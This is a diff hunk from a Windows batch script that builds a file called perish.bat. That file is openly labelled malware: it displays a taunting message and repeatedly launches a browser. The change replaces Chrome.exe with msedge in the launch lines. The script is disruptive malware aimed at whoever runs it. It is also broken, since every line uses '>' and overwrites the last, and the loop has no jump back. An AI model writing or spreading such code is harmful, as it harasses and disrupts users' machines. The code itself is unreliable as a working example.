@@ -36,13 +36,13 @@ pause
 echo ^@echo off > perish.bat
 echo echo YOUR COMPUTER HAS BEEN FUCKED BY THIS MALWARE! GOOD LUCK GETTIN YOUR PC BACK. > perish.bat
 echo :loop > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
-echo start Chrome.exe > perish.bat
+echo start msedge > perish.bat
+echo start msedge > perish.bat
+echo start msedge> perish.bat
+echo start msedge > perish.bat
+echo start msedge > perish.bat
+echo start msedge > perish.bat
+echo start msedge > perish.bat
 
    
 echo pause > perish.bat
